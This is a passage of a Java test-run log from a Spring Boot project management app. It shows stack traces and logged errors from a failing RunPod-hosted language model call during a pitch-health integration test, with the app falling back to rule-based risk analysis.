	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.PitchHealthControllerIntegrationTest.getAllActiveCycleHealth_WithAI_ShouldReturnEnhancedAnalysis(PitchHealthControllerIntegrationTest.java:265) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:46.651Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.RiskAnalysisService      : AI analysis failed, falling back to rule-based: Failed to get response from RunPod: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.650104","status":500}
2026-01-17T23:26:46.651Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 63 (withAI=true, TTL=infinite)
2026-01-17T23:26:46.655Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache miss: pitch risk 64 (withAI=true)
2026-01-17T23:26:46.657Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : Submitting prompt to RunPod: 689 chars
2026-01-17T23:26:46.657Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod request payload: {"input":{"max_tokens":2048,"temperature":0.3,"model":"mistral:instruct","prompt":"You are a project risk advisor for a software development team using the Shape Up methodology.\n\nAnalyze the following pitch and provide risk insights:\n\nPitch Title: At Risk Pitch\nDescription: Test description for At Risk Pitch\nAppetite: 10 days\nStatus: IN_PROGRESS\nProgress: 112.5%\nCycle Progress: 50.0%\nTeam: Health Test Team\n\nIdentified Risk Factors:\n- UNCLEAR_REQUIREMENTS: Pitch description is missing or too brief (Impact: 5/10)\n\nProvide your analysis in the following format:\nINSIGHTS:\n- [insight 1]\n- [insight 2]\n- [insight 3]\n\nRECOMMENDATIONS:\n- [recommendation 1]\n- [recommendation 2]\n- [recommendation 3]\n\nCONFIDENCE: [0-100]\n\nKeep insights actionable and specific to this pitch."}}
2026-01-17T23:26:46.660Z ERROR 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod API call failed: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.659764","status":500}

java.lang.RuntimeException: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.659764","status":500}
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.submitJob(RunPodChatModel.java:128) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.generate(RunPodChatModel.java:81) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.generateAIInsights(RiskAnalysisService.java:588) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.analyzePitchRisk(RiskAnalysisService.java:145) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.analyzePitchRisk(RiskAnalysisService.java:94) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService$$SpringCGLIB$$0.analyzePitchRisk(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.buildPitchHealth(PitchHealthService.java:342) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.lambda$getCycleHealthSummary$2(PitchHealthService.java:200) ~[classes/:na]
	at java.base/java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:197) ~[na:na]
	at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1708) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:509) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:499) ~[na:na]
	at java.base/java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:921) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) ~[na:na]
	at java.base/java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:682) ~[na:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.getCycleHealthSummary(PitchHealthService.java:201) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.lambda$getAllActiveCycleHealth$12(PitchHealthService.java:295) ~[classes/:na]
	at java.base/java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:197) ~[na:na]
	at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1708) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:509) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:499) ~[na:na]
	at java.base/java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:921) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) ~[na:na]
	at java.base/java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:682) ~[na:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.getAllActiveCycleHealth(PitchHealthService.java:296) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService$$SpringCGLIB$$0.getAllActiveCycleHealth(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.PitchHealthController.getAllActiveCycleHealthWithAI(PitchHealthController.java:73) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:903) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:564) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
